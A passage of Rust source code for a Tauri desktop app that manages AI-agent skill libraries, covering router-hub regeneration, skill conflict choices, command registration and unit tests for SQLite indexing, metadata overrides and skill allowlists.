        format!(
            "router-hub dry-run: {} collections planned, {} duplicate-children, {} health warnings",
            report.total_collections,
            report.duplicate_children.len(),
            report.health_warnings.len()
        )
    };
    write_audit_event(connection, "router_hub_regenerate", &summary, detail)
}

#[tauri::command]
fn regenerate_router_hubs(commit: bool) -> Result<RouterHubReport, String> {
    let root = resolve_legacy_root()?;
    let connection = open_index_database(&root)?;
    let consent = read_operator_consent(&connection).unwrap_or(OperatorConsentCard {
        real_writes_enabled: false,
        enabled_at: String::new(),
        updated_at: String::new(),
        summary: String::new(),
    });
    let report = plan_or_write_router_hubs(&root, commit, consent.real_writes_enabled)?;
    // Even dry-runs are audited so timeline shows when the user surveyed router state.
    let _ = record_router_hub_audit(&connection, &report);
    Ok(report)
}

#[tauri::command]
fn set_skill_conflict_choice(
    conflict_key: String,
    default_skill_id: String,
    status: String,
) -> Result<LegacySnapshot, String> {
    let normalized_key = normalize_skill_lookup(&conflict_key);
    if normalized_key.is_empty() {
        return Err("Skill 冲突名不能为空。".to_string());
    }

    let normalized_status = match status.trim() {
        "default-set" => "default-set",
        "ignored" => "ignored",
        "unresolved" => "unresolved",
        _ => return Err("Unsupported skill conflict status.".to_string()),
    };

    let root = resolve_legacy_root()?;
    let connection = open_index_database(&root)?;
    let skills = read_indexed_skills(&connection)?;
    let conflicts = derive_skill_conflicts(&skills, &HashMap::new());
    let conflict = conflicts
        .iter()
        .find(|item| item.conflict_key == normalized_key)
        .ok_or_else(|| format!("Cannot find duplicated Skill '{}'.", normalized_key))?;

    let selected_skill_id = if normalized_status == "default-set" {
        let candidate = default_skill_id.trim();
        if !conflict
            .choices
            .iter()
            .any(|choice| choice.skill_id == candidate)
        {
            return Err(format!(
                "Selected Skill is not a candidate for '{}'.",
                normalized_key
            ));
        }
        candidate.to_string()
    } else {
        String::new()
    };

    let timestamp = unix_timestamp_string();
    connection
        .execute(
            "INSERT INTO skill_conflict_choices (
                conflict_key, default_skill_id, status, updated_at
            ) VALUES (?1, ?2, ?3, ?4)
            ON CONFLICT(conflict_key) DO UPDATE SET
                default_skill_id = excluded.default_skill_id,
                status = excluded.status,
                updated_at = excluded.updated_at",
            params![
                normalized_key,
                selected_skill_id,
                normalized_status,
                timestamp
            ],
        )
        .map_err(|error| format!("Cannot save Skill conflict choice: {}", error))?;

    write_audit_event(
        &connection,
        "skill_conflict_choice_updated",
        &format!("Updated Skill conflict choice for {}", conflict.child_name),
        serde_json::json!({
            "conflictKey": conflict.conflict_key,
            "childName": conflict.child_name,
            "status": normalized_status,
            "defaultSkillId": default_skill_id,
        }),
    )?;

    sync_local_sources_to_agents(&root, &connection)?;

    scan_legacy_snapshot_blocking()
}

fn normalize_source_type(value: &str) -> String {
    match value.to_lowercase().as_str() {
        "skills" | "skill" => "skill".to_string(),
        "prompt" | "prompts" => "prompt".to_string(),
        "mixed" => "mixed".to_string(),
        _ => "skill".to_string(),
    }
}

const DAY_NANOS: u128 = 86_400_000_000_000;

fn compact_note(value: &str) -> String {
    value.split_whitespace().collect::<Vec<_>>().join(" ")
}

fn json_string(value: &Value, key: &str) -> String {
    value
        .get(key)
        .and_then(Value::as_str)
        .unwrap_or_default()
        .to_string()
}

fn json_bool(value: &Value, key: &str) -> bool {
    value.get(key).and_then(Value::as_bool).unwrap_or(false)
}

fn json_u64(value: &Value, key: &str) -> u64 {
    value.get(key).and_then(Value::as_u64).unwrap_or(0)
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    tauri::Builder::default()
        .plugin(tauri_plugin_opener::init())
        .plugin(tauri_plugin_process::init())
        .plugin(tauri_plugin_updater::Builder::new().build())
        .invoke_handler(tauri::generate_handler![
            load_indexed_snapshot,
            scan_legacy_snapshot,
            reanalyze_library_metadata,
            run_skillhub_sync,
            ensure_agent_skill_delivery,
            set_source_version_pin,
            refresh_source_version_status,
            rollback_source_to_latest_backup,
            refresh_agent_detection,
            set_agent_adapter_enabled,
            set_workspace_enabled,
            set_preset_enabled,
            set_desktop_qa_check_status,
            set_skill_metadata,
            set_skill_enabled,
            set_skill_rating,
            set_source_rating,
            create_skill_folder,
            update_skill_folder,
            delete_skill_folder,
            move_skill_to_folder,
            move_source_skills_to_folder,
            move_skill_folder,
            set_source_metadata,
            set_sources_bulk_metadata,
            set_skill_tags,
            set_source_tags,
            delete_managed_source,
            set_preset_workspace_enabled,
            set_real_write_authorization,
            run_release_gate_runner,
            open_release_gate_export_path,
            scan_mcp_connections,
            scan_codex_plugin_doctor,
            preview_source_import_candidate,
            stage_source_import_candidate,
            cancel_source_import,
            load_prompt_invocation,
            open_prompt_source_folder,
            promote_staged_source_import,
            record_usage_event,
            refresh_source_popularity,
            regenerate_router_hubs,
            set_skill_conflict_choice,
            preview_legacy_cleanup_candidates,
            cleanup_legacy_candidate
        ])
        .run(tauri::generate_context!())
        .expect("failed to run AI SkillHub app");
}

#[cfg(test)]
mod tests {
    use super::*;

    fn write_runtime_markers(root: &Path) {
        let runtime = app_next_runtime_root(root);
        fs::create_dir_all(&runtime).expect("runtime folder should be created");
        fs::write(runtime.join("SkillHub.ps1"), "# test skillhub runner")
            .expect("SkillHub marker should be written");
        fs::write(
            runtime.join("Manage-AgentSkillLinks.ps1"),
            "# test agent link runner",
        )
        .expect("agent link marker should be written");
    }

    #[test]
    fn runtime_root_probe_finds_project_from_nested_exe_folder() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-root-probe-test-{}",
            unix_timestamp_string()
        ));
        let nested = root
            .join("app-next")
            .join("src-tauri")
            .join("target")
            .join("release");
        fs::create_dir_all(&nested).expect("nested release folder should be created");
        write_runtime_markers(&root);

        let resolved = find_skillhub_root_from(&nested).expect("root should resolve");
        assert_eq!(resolved, root);

        let _ = fs::remove_dir_all(resolved);
    }

    #[test]
    fn runtime_root_probe_rejects_incomplete_project_folder() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-root-probe-missing-test-{}",
            unix_timestamp_string()
        ));
        let runtime = app_next_runtime_root(&root);
        fs::create_dir_all(&runtime).expect("runtime folder should be created");
        fs::write(runtime.join("SkillHub.ps1"), "# missing agent linker")
            .expect("partial marker should be written");

        assert!(!is_skillhub_root(&root));
        assert!(find_skillhub_root_from(&runtime).is_none());

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn scan_legacy_snapshot_is_read_only_and_resolves_root() {
        let snapshot = scan_legacy_snapshot_blocking().expect("legacy snapshot should scan");

        assert_eq!(snapshot.mode, "read-only");
        assert!(Path::new(&snapshot.root).exists());
        assert!(snapshot.skills_dir.ends_with("skills"));
        assert!(snapshot.sources_dir.ends_with("github_sources"));
        assert!(snapshot
            .diagnostics_file
            .ends_with("latest-diagnostics.json"));
        assert!(snapshot.index.persisted);
        assert!(!snapshot.agent_adapters.is_empty());
        assert!(!snapshot.adapter_safety_checks.is_empty());
        assert!(!snapshot.adapter_capabilities.is_empty());
        assert!(!snapshot.project_scans.is_empty());
        assert!(!snapshot.snapshots.is_empty());
        assert!(!snapshot.backup_targets.is_empty());
        assert!(!snapshot.backup_dry_run.is_empty());
        assert!(!snapshot.restore_dry_run.is_empty());
        assert!(!snapshot.rollback_plan.is_empty());
        assert_eq!(snapshot.index.skills_indexed, snapshot.skills.len());
        assert_eq!(snapshot.index.sources_indexed, snapshot.sources.len());
        assert_eq!(snapshot.index.agents_indexed, snapshot.agents.len());
    }

    #[test]
    fn load_indexed_snapshot_reads_from_sqlite() {
        scan_legacy_snapshot_blocking().expect("legacy snapshot should seed sqlite");
        let snapshot = load_indexed_snapshot_blocking().expect("indexed snapshot should load");

        assert_eq!(snapshot.mode, "sqlite-index");
        assert!(snapshot.index.persisted);
        assert!(!snapshot.workspaces.is_empty());
        assert!(!snapshot.presets.is_empty());
        assert!(!snapshot.agent_adapters.is_empty());
        assert!(!snapshot.adapter_safety_checks.is_empty());
        assert!(!snapshot.adapter_capabilities.is_empty());
        assert!(!snapshot.project_scans.is_empty());
        assert!(!snapshot.snapshots.is_empty());
        assert!(!snapshot.backup_targets.is_empty());
        assert!(!snapshot.backup_dry_run.is_empty());
        assert!(!snapshot.restore_dry_run.is_empty());
        assert!(!snapshot.rollback_plan.is_empty());
        assert_eq!(snapshot.index.skills_indexed, snapshot.skills.len());
    }

    #[test]
    fn stable_id_handles_non_ascii_values() {
        let first = stable_id("preset", "论文科研");
        let second = stable_id("preset", "界面设计");

        assert_ne!(first, second);
        assert!(first.starts_with("preset-"));
        assert!(second.starts_with("preset-"));
    }

    fn test_skill_card(
        name: &str,
        source: &str,
        relative_path: &str,
        is_router_hub: bool,
    ) -> SkillCard {
        SkillCard {
            id: stable_id("skill", name),
            source_id: String::new(),
            name: name.to_string(),
            folder_name: name.to_string(),
            category: "test".to_string(),
            description: "test skill".to_string(),
            note: String::new(),
            source: source.to_string(),
            health: "ok".to_string(),
            enabled: true,
            rating: 0,
            relative_path: relative_path.to_string(),
            tags: Vec::new(),
            usage_guide: String::new(),
            metadata_origin: "test".to_string(),
            metadata_confidence: 1.0,
            is_router_hub,
            user_folder_id: String::new(),
            user_folder_name: String::new(),
            user_folder_color: String::new(),
        }
    }

    fn test_source_card(id: &str, name: &str, local_path: &Path, url: &str) -> SourceCard {
        SourceCard {
            id: id.to_string(),
            name: name.to_string(),
            source_type: "skill".to_string(),
            health: "ok".to_string(),
            url: url.to_string(),
            skill_count: 1,
            mode: "scan".to_string(),
            category_id: "test".to_string(),
            note: String::new(),
            local_path: local_path.display().to_string(),
            enabled: true,
            rating: 0,
            tags: Vec::new(),
            created_at: "0".to_string(),
            usage_guide: String::new(),
            metadata_origin: "test".to_string(),
            metadata_confidence: 1.0,
            user_folder_id: String::new(),
            user_folder_name: String::new(),
            user_folder_color: String::new(),
        }
    }

    #[test]
    fn automatic_metadata_refresh_preserves_manual_overrides() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-metadata-override-test-{}",
            unix_timestamp_string()
        ));
        fs::create_dir_all(&root).expect("test root should be created");

        let mut original_source =
            test_source_card("source-metadata-test", "metadata-pack", &root, "");
        original_source.category_id = "论文科研".to_string();
        original_source.note = "自动来源摘要 v1".to_string();
        original_source.tags = vec!["自动标签-v1".to_string()];
        original_source.usage_guide = "自动来源用法 v1".to_string();
        original_source.metadata_origin = "offline-v304-1:readme".to_string();
        original_source.metadata_confidence = 0.78;

        let mut original_skill =
            test_skill_card("metadata-skill", "metadata-pack", "metadata-skill", false);
        original_skill.category = "论文科研".to_string();
        original_skill.description = "自动 Skill 摘要 v1".to_string();
        original_skill.tags = vec!["自动标签-v1".to_string()];
        original_skill.usage_guide = "自动 Skill 用法 v1".to_string();
        original_skill.metadata_origin = "offline-v304-1:skill-frontmatter".to_string();
        original_skill.metadata_confidence = 0.84;

        persist_snapshot(
            &root,
            &test_snapshot(
                &root,
                vec![original_source],
                vec![original_skill],
                Vec::new(),
            ),
        )
        .expect("initial inferred metadata should persist");

        let connection = open_index_database(&root).expect("test database should open");
        set_source_metadata_override_in_connection(
            &connection,
            "source-metadata-test",
            "人工来源名称",
            "skill",
            "人工来源分类",
            "人工来源备注",
            true,
        )
        .expect("source override should save");
        set_skill_metadata_override_in_connection(
            &connection,
            "metadata-skill",
            "人工 Skill 名称",
            "人工 Skill 分类",
            "人工 Skill 说明",
            "人工 Skill 备注",
        )
        .expect("skill override should save");
        set_source_tags_in_connection(
            &connection,
            "source-metadata-test",
            &["人工来源标签".to_string()],
        )
        .expect("source tag override should save");
        set_skill_tags_in_connection(
            &connection,
            "metadata-skill",
            &["人工 Skill 标签".to_string()],
        )
        .expect("skill tag override should save");
        drop(connection);

        let mut refreshed_source =
            test_source_card("source-metadata-test", "metadata-pack", &root, "");
        refreshed_source.category_id = "工程开发".to_string();
        refreshed_source.note = "自动来源摘要 v2".to_string();
        refreshed_source.tags = vec!["自动标签-v2".to_string()];
        refreshed_source.usage_guide = "自动来源用法 v2".to_string();
        refreshed_source.metadata_origin = "offline-v304-1:readme+git".to_string();
        refreshed_source.metadata_confidence = 0.91;

        let mut refreshed_skill =
            test_skill_card("metadata-skill", "metadata-pack", "metadata-skill", false);
        refreshed_skill.category = "工程开发".to_string();
        refreshed_skill.description = "自动 Skill 摘要 v2".to_string();
        refreshed_skill.tags = vec!["自动标签-v2".to_string()];
        refreshed_skill.usage_guide = "自动 Skill 用法 v2".to_string();
        refreshed_skill.metadata_origin = "offline-v304-1:skill-frontmatter+readme".to_string();
        refreshed_skill.metadata_confidence = 0.93;

        persist_snapshot(
            &root,
            &test_snapshot(
                &root,
                vec![refreshed_source],
                vec![refreshed_skill],
                Vec::new(),
            ),
        )
        .expect("refreshed inferred metadata should persist");

        let connection = open_index_database(&root).expect("test database should reopen");
        let sources = read_indexed_sources(&connection).expect("sources should read");
        let skills = read_indexed_skills(&connection).expect("skills should read");
        assert_eq!(sources[0].name, "人工来源名称");
        assert_eq!(sources[0].category_id, "人工来源分类");
        assert_eq!(sources[0].note, "人工来源备注");
        assert_eq!(sources[0].usage_guide, "自动来源用法 v2");
        assert!(sources[0].metadata_origin.starts_with("manual+"));
        assert!(sources[0].tags.contains(&"人工来源标签".to_string()));
        assert_eq!(skills[0].name, "人工 Skill 名称");
        assert_eq!(skills[0].category, "人工 Skill 分类");
        assert_eq!(skills[0].description, "人工 Skill 说明");
        assert_eq!(skills[0].note, "人工 Skill 备注");
        assert_eq!(skills[0].usage_guide, "自动 Skill 用法 v2");
        assert!(skills[0].metadata_origin.starts_with("manual+"));
        assert!(skills[0].tags.contains(&"人工 Skill 标签".to_string()));

        let _ = fs::remove_dir_all(root);
    }

    fn test_snapshot(
        root: &Path,
        sources: Vec<SourceCard>,
        skills: Vec<SkillCard>,
        agents: Vec<AgentCard>,
    ) -> LegacySnapshot {
        let agent_adapters = derive_agent_adapters(&agents);
        let adapter_safety_checks = derive_adapter_safety_checks(&agent_adapters);
        let adapter_capabilities = derive_adapter_capabilities(&agent_adapters);
        let backup_targets = derive_backup_targets(root, &agent_adapters);
        let backup_dry_run = derive_backup_dry_run(&backup_targets);
        let restore_dry_run = derive_restore_dry_run(&backup_targets);
        let diagnostics = DiagnosticSummary {
            available: true,
            app_version: "test".to_string(),
            generated_at: "0".to_string(),
            overall_status: "ok".to_string(),
            ok: 1,
            warn: 0,
            error: 0,
            info: 0,
        };

        LegacySnapshot {
            root: root.display().to_string(),
            skills_dir: root.join("skills").display().to_string(),
            sources_dir: active_sources_dir(root).display().to_string(),
            diagnostics_file: diagnostics_file(root).display().to_string(),
            mode: "test".to_string(),
            summary: LegacySummary {
                skills: skills.len(),
                sources: sources.len(),
                prompts: 0,
                agents_detected: agents.iter().filter(|agent| agent.detected).count(),
                warnings: 0,
                diagnostics_status: diagnostics.overall_status.clone(),
            },
            skills,
            sources,
            agents,
            agent_skill_statuses: Vec::new(),
            agent_adapters,
            agent_doctors: Vec::new(),
            adapter_safety_checks,
            adapter_capabilities,
            workspaces: Vec::new(),
            project_scans: Vec::new(),
            presets: Vec::new(),
            snapshots: Vec::new(),
            backup_targets,
            backup_dry_run,
            restore_dry_run,
            rollback_plan: Vec::new(),
            release_reports: Vec::new(),
            import_previews: Vec::new(),
            source_popularity: Vec::new(),
            source_governance: Vec::new(),
            source_quality_signals: Vec::new(),
            last_sync_summary: SyncSummaryCard::default(),
            skill_conflicts: Vec::new(),
            operator_consent: OperatorConsentCard {
                real_writes_enabled: false,
                enabled_at: String::new(),
                updated_at: String::new(),
                summary: "test".to_string(),
            },
            tags: Vec::new(),
            skill_folders: Vec::new(),
            preset_distributions: Vec::new(),
            operation_runners: Vec::new(),
            write_gates: Vec::new(),
            desktop_qa_checks: Vec::new(),
            usage_stats: Vec::new(),
            audit_events: Vec::new(),
            diagnostics,
            index: IndexReport {
                persisted: false,
                database_file: database_file(root).display().to_string(),
                indexed_at: String::new(),
                sources_indexed: 0,
                skills_indexed: 0,
                agents_indexed: 0,
                snapshot_id: String::new(),
            },
        }
    }

    #[test]
    fn agent_detection_refresh_preserves_skill_library_metadata() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-agent-refresh-preserve-test-{}",
            unix_timestamp_string()
        ));
        let source_dir = active_sources_dir(&root).join("alpha-pack");
        fs::create_dir_all(&source_dir).unwrap();
        let source = test_source_card(
            "source-alpha-pack",
            "alpha-pack",
            &source_dir,
            "https://github.com/example/alpha-pack.git",
        );
        let skill = test_skill_card("alpha-skill", "alpha-pack", "alpha-pack/alpha-skill", false);
        let initial_agent = AgentCard {
            id: "claude".to_string(),
            name: "Claude Desktop / Claude Code".to_string(),
            path: root.join("claude-skills").display().to_string(),
            detected: true,
            managed: true,
            enabled: true,
            skill_count: 0,
        };
        let snapshot = test_snapshot(&root, vec![source], vec![skill], vec![initial_agent]);

        persist_snapshot(&root, &snapshot).expect("test snapshot should persist");
        let mut connection = open_index_database(&root).expect("test database should open");
        let workspace_id = connection
            .query_row(
                "SELECT id FROM workspaces WHERE scope = 'global' LIMIT 1",
                [],
                |row| row.get::<_, String>(0),
            )
            .expect("derived workspace should exist");
        let timestamp = unix_timestamp_string();
        connection
            .execute(
                "INSERT INTO presets (
                    id, name, description, color, enabled, created_at, updated_at
                ) VALUES ('preset-refresh-test', 'Refresh test', '', 'mint', 1, ?1, ?1)",
                params![&timestamp],
            )
            .expect("test preset should insert");
        set_preset_workspace_enabled_in_connection(
            &connection,
            "preset-refresh-test",
            &workspace_id,
            true,
        )
        .expect("preset workspace policy should save");
        connection
            .execute(
                "INSERT OR REPLACE INTO source_overrides (
                    source_id, display_name, source_type, category_id, note, enabled, updated_at
                ) VALUES (?1, '', '', '', ?2, NULL, ?3)",
                params![
                    "source-alpha-pack",
                    "keep this source note",
                    unix_timestamp_string()
                ],
            )
            .expect("source note override should persist");

        let diagnostics = serde_json::json!({
            "appVersion": "test",
            "generatedAt": "now",
            "overallStatus": "ok",
            "summary": { "ok": 1, "warn": 0, "error": 0, "info": 0 },
            "agents": [{
                "id": "codex",
                "name": "OpenAI Codex",
                "command": "codex",
                "detected": true,
                "skillsDirs": [{
                    "path": root.join("codex-skills").display().to_string(),
                    "exists": true,
                    "isLink": false,
                    "writable": true
                }]
            }]
        });
        persist_agent_detection_refresh(&root, &mut connection, Some(&diagnostics))
            .expect("agent-only refresh should persist");

        let refreshed = read_snapshot_from_database(&root, &connection)
            .expect("refreshed snapshot should read");
        assert_eq!(refreshed.sources.len(), 1);
        assert_eq!(refreshed.skills.len(), 1);
        assert_eq!(refreshed.sources[0].note, "keep this source note");
        let preserved_policy = connection
            .query_row(
                "SELECT enabled FROM preset_workspaces
                WHERE preset_id = 'preset-refresh-test' AND workspace_id = ?1",
                params![&workspace_id],
                |row| row.get::<_, i64>(0),
            )
            .expect("preset workspace policy should survive agent refresh");
        assert_eq!(preserved_policy, 1);
        assert!(refreshed
            .agent_adapters
            .iter()
            .any(|adapter| adapter.id == "codex" && adapter.detected));

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn agent_skill_statuses_report_installed_missing_and_agent_gaps() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-agent-status-test-{}",
            unix_timestamp_string()
        ));
        let agent_root = root.join("codex-skills");
        fs::create_dir_all(agent_root.join("paper-workflow")).unwrap();
        fs::write(
            agent_root.join("paper-workflow").join("SKILL.md"),
            "---\nname: paper-workflow\ndescription: test\n---\n",
        )
        .unwrap();
        for skill_name in ["paper-workflow", "figure-planner"] {
            let skill_root = active_skills_dir(&root).join(skill_name);
            fs::create_dir_all(&skill_root).unwrap();
            fs::write(
                skill_root.join("SKILL.md"),
                format!("---\nname: {skill_name}\ndescription: Host eligibility fixture.\n---\n"),
            )
            .unwrap();
        }
        let skills = vec![
            test_skill_card("paper-workflow", "paper-pack", "paper-workflow", false),
            test_skill_card("figure-planner", "paper-pack", "figure-planner", false),
        ];
        let agents = vec![
            AgentCard {
                id: "codex".to_string(),
                name: "OpenAI Codex".to_string(),
                path: agent_root.display().to_string(),
                detected: true,
                managed: true,
                enabled: true,
                skill_count: 0,
            },
            AgentCard {
                id: "antigravity".to_string(),
                name: "Antigravity".to_string(),
                path: root.join("antigravity-skills").display().to_string(),
                detected: false,
                managed: false,
                enabled: false,
                skill_count: 0,
            },
        ];

        let statuses = derive_agent_skill_statuses(&root, &skills, &agents);
        assert!(statuses.iter().any(|status| {
            status.agent_id == "codex"
                && status.skill_folder_name == "paper-workflow"
                && status.status == "installed"
        }));
        assert!(statuses.iter().any(|status| {
            status.agent_id == "codex"
                && status.skill_folder_name == "figure-planner"
                && status.status == "missing"
        }));
        assert!(statuses.iter().any(|status| {
            status.agent_id == "antigravity" && status.status == "agent-missing"
        }));

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn agent_delivery_allowlist_respects_skill_and_source_enabled_state() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-agent-allowlist-test-{}",
            unix_timestamp_string()
        ));
        let connection = open_index_database(&root).expect("test sqlite should open");
        let timestamp = unix_timestamp_string();
        for (id, enabled) in [("enabled-source", 1), ("disabled-source", 0)] {
            connection
                .execute(
                    "INSERT INTO sources (
                        id, name, source_type, url, local_path, install_mode,
                        category_id, note, enabled, created_at, updated_at
                    ) VALUES (?1, ?1, 'skill', '', '', 'scan', 'test', '', ?2, ?3, ?3)",
                    params![id, enabled, &timestamp],
                )
                .expect("source row should insert");
        }
        for (id, source_id, folder_name) in [
            ("skill-enabled", "enabled-source", "enabled-skill"),
            ("skill-disabled", "enabled-source", "disabled-skill"),
            (
                "skill-source-off",
                "disabled-source",
                "source-disabled-skill",
            ),
        ] {
            connection
                .execute(
                    "INSERT INTO skills (
                        id, source_id, name, folder_name, description, category_id,
                        health_status, health_summary, enabled, relative_path,
                        created_at, updated_at
                    ) VALUES (?1, ?2, ?3, ?3, 'test', 'test', 'ok', '', 1, ?3, ?4, ?4)",
                    params![id, source_id, folder_name, &timestamp],
                )
                .expect("skill row should insert");
        }
        connection
            .execute(
                "INSERT INTO skill_overrides (
                    skill_id, display_name, category_id, description, note,
                    enabled, rating, updated_at
                ) VALUES ('skill-disabled', '', '', '', '', 0, 0, ?1)",
                params![&timestamp],
            )
            .expect("disabled override should insert");
        drop(connection);

        for folder_name in ["enabled-skill", "disabled-skill", "source-disabled-skill"] {
            let skill_dir = active_skills_dir(&root).join(folder_name);
            fs::create_dir_all(&skill_dir).expect("active Skill folder should create");
            fs::write(
                skill_dir.join("SKILL.md"),
                format!("---\nname: {folder_name}\ndescription: test Skill\n---\n"),
            )
            .expect("active Skill manifest should write");
        }

        let allowlist_path = write_agent_skill_allowlist(&root).expect("allowlist should write");
        let enabled: Vec<String> = serde_json::from_str(
            &fs::read_to_string(&allowlist_path).expect("allowlist should read"),
        )
        .expect("allowlist should parse");
        assert_eq!(enabled, vec!["enabled-skill".to_string()]);

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn agent_delivery_allowlist_publishes_parent_and_routes_children_through_it() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-agent-final-entry-allowlist-test-{}",
            unix_timestamp_string()
        ));
        let connection = open_index_database(&root).expect("test sqlite should open");
        let timestamp = unix_timestamp_string();
        for source_id in ["source-a", "source-b"] {
            let source_path = active_sources_dir(&root).join(source_id);
            fs::create_dir_all(&source_path).expect("source folder should create");
            connection
                .execute(
                    "INSERT INTO sources (
                        id, name, source_type, url, local_path, install_mode,
                        category_id, note, enabled, created_at, updated_at
                    ) VALUES (?1, ?1, 'skill', '', ?2, 'scan', 'test', '', 1, ?3, ?3)",
                    params![source_id, source_path.display().to_string(), &timestamp],
                )
                .expect("source row should insert");
        }
        for (id, source_id, folder_name) in [
            ("skill-a", "source-a", "shared"),
            ("skill-b", "source-b", "source-b__shared"),
        ] {
            connection
                .execute(
                    "INSERT INTO skills (
                        id, source_id, name, folder_name, description, category_id,
                        health_status, health_summary, enabled, relative_path,
                        created_at, updated_at
                    ) VALUES (?1, ?2, 'shared', ?3, 'test', 'test', 'ok', '', 1, ?3, ?4, ?4)",
                    params![id, source_id, folder_name, &timestamp],
                )
                .expect("skill row should insert");
        }
        connection
            .execute(
                "INSERT INTO skill_overrides (
                    skill_id, display_name, category_id, description, note,
                    enabled, rating, updated_at
                ) VALUES ('skill-b', '', '', '', '', 0, 0, ?1)",
                params![&timestamp],
            )
            .expect("disabled duplicate override should insert");
        drop(connection);

        let active_root = active_skills_dir(&root);
        for (entry_name, body) in [
            (
                "source-a-shared",
                "---\nname: source-a-shared\ndescription: \"[ROUTER-HUB] [CONFLICT-DISPATCHER] alias\"\n---\n\nOriginal duplicate Skill:\n- Skill name: `$shared`\n- Source: `source-a`\n",
            ),
            (
                "source-b-shared",
                "---\nname: source-b-shared\ndescription: \"[ROUTER-HUB] [CONFLICT-DISPATCHER] alias\"\n---\n\nOriginal duplicate Skill:\n- Skill name: `$shared`\n- Source: `source-b`\n",
            ),
            (
                "research",
                "---\nname: research\ndescription: \"[ROUTER-HUB] AI SkillHub generated parent router for the local source-a skill collection.\"\n---\n",
            ),
            (
                "disabled-parent",
                "---\nname: disabled-parent\ndescription: \"[ROUTER-HUB] AI SkillHub generated parent router for the local source-b skill collection.\"\n---\n",
            ),
        ] {
            let entry_dir = active_root.join(entry_name);
            fs::create_dir_all(&entry_dir).expect("final active entry should create");
            fs::write(entry_dir.join("SKILL.md"), body)
                .expect("generated active manifest should write");
        }

        let allowlist_path = write_agent_skill_allowlist(&root).expect("allowlist should write");
        let enabled: Vec<String> = serde_json::from_str(
            &fs::read_to_string(&allowlist_path).expect("allowlist should read"),
        )
        .expect("allowlist should parse");
        assert_eq!(enabled, vec!["research".to_string()]);

        let recipient_root = root.join("recipient-skills");
        let entry_name = "research";
        let recipient_entry = recipient_root.join(entry_name);
        fs::create_dir_all(&recipient_entry).expect("recipient entry should create");
        fs::copy(
            active_root.join(entry_name).join("SKILL.md"),
            recipient_entry.join("SKILL.md"),
        )
        .expect("recipient manifest should copy");
        let mut shared_skill = test_skill_card(
            "source-a__shared",
            "source-a",
            "github_sources\\source-a\\shared",
            false,
        );
        shared_skill.name = "shared".to_string();
        let parent_skill = test_skill_card("source-a", "source-a", "skills\\source-a", true);
        let agent = AgentCard {
            id: "agent-codex-test".to_string(),
            name: "ChatGPT Desktop / OpenAI Codex".to_string(),
            path: recipient_root.display().to_string(),
            detected: true,
            managed: true,
            enabled: true,
            skill_count: 0,
        };
        let statuses = derive_agent_skill_statuses(&root, &[shared_skill, parent_skill], &[agent]);
        assert!(statuses.iter().any(|status| {
            status.skill_folder_name == "source-a__shared"
                && status.status == "routed-via-parent"
                && status.expected_path.ends_with("research")
        }));
        assert!(statuses.iter().any(|status| {
            status.skill_folder_name == "source-a"
                && status.status == "installed"
                && status.expected_path.ends_with("research")
        }));

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn managed_source_delete_path_rejects_outside_folder() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-delete-path-test-{}",
            unix_timestamp_string()
        ));
        fs::create_dir_all(active_sources_dir(&root)).unwrap();
        let outside = std::env::temp_dir().join(format!(
            "skillhub-delete-outside-{}",
            unix_timestamp_string()
        ));
        fs::create_dir_all(&outside).unwrap();
        let outside_source = test_source_card("source-outside", "outside", &outside, "");

        assert!(validate_managed_source_delete_path(&root, &outside_source).is_err());

        let managed = active_sources_dir(&root).join("paper-pack");
        fs::create_dir_all(&managed).unwrap();
        let managed_source = test_source_card("source-paper-pack", "paper-pack", &managed, "");
        assert!(validate_managed_source_delete_path(&root, &managed_source).is_ok());

        let _ = fs::remove_dir_all(root);
        let _ = fs::remove_dir_all(outside);
    }

    #[test]
    fn runtime_config_repo_matches_source_by_github_url() {
        let repo = serde_json::json!({
            "url": "https://github.com/example/paper-pack"
        });
        let source = test_source_card(
            "source-paper-pack",
            "paper-pack",
            Path::new("paper-pack"),
            "https://github.com/example/paper-pack.git",
        );

        assert!(runtime_config_repo_matches_source(&repo, &source));
    }

    #[test]
    fn skill_conflict_selector_keeps_duplicate_children_as_candidates() {
        let skills = vec![
            test_skill_card(
                "figure-planner",
                "Nature-Paper-Skills",
                "Nature-Paper-Skills/skills/core/figure-planner",
                false,
            ),
            test_skill_card(
                "figure-planner",
                "PaperSpine",
                "PaperSpine/dist/codex/skills/figure-planner",
                false,
            ),
            test_skill_card(
                "figure-planner",
                ROUTER_HUB_FOLDER,
                "AI-SkillHub-local-routers/figure-planner",
                true,
            ),
        ];

        let conflicts = derive_skill_conflicts(&skills, &HashMap::new());

        assert_eq!(conflicts.len(), 1);
        assert_eq!(conflicts[0].conflict_key, "figure-planner");
        assert_eq!(conflicts[0].choices.len(), 2);
        assert!(conflicts[0]
            .choices
            .iter()
            .any(|choice| choice.source_name == "Nature-Paper-Skills"));
        assert!(conflicts[0]
            .choices
            .iter()
            .any(|choice| choice.source_name == "PaperSpine"));
    }

    #[test]
    fn skill_conflict_selector_preserves_manual_default_and_auto_recovers_missing_choice() {
        let skills = vec![
            test_skill_card(
                "figure-planner",
                "Nature-Paper-Skills",
                "Nature-Paper-Skills/skills/core/figure-planner",
                false,
            ),
            test_skill_card(
                "figure-planner",
                "PaperSpine",
                "PaperSpine/dist/codex/skills/figure-planner",
                false,
            ),
        ];
        let mut saved = HashMap::new();
        saved.insert(
            "figure-planner".to_string(),
            SkillConflictChoiceState {
                default_skill_id: "PaperSpine/dist/codex/skills/figure-planner".to_string(),
                status: "default-set".to_string(),
                updated_at: "1780000000".to_string(),
            },
        );

        let conflicts = derive_skill_conflicts(&skills, &saved);
        assert_eq!(conflicts[0].status, "default-set");
        assert_eq!(conflicts[0].default_source_name, "PaperSpine");

        saved.insert(
            "figure-planner".to_string(),
            SkillConflictChoiceState {
                default_skill_id: "missing/figure-planner".to_string(),
                status: "default-set".to_string(),
                updated_at: "1780000001".to_string(),
            },
        );
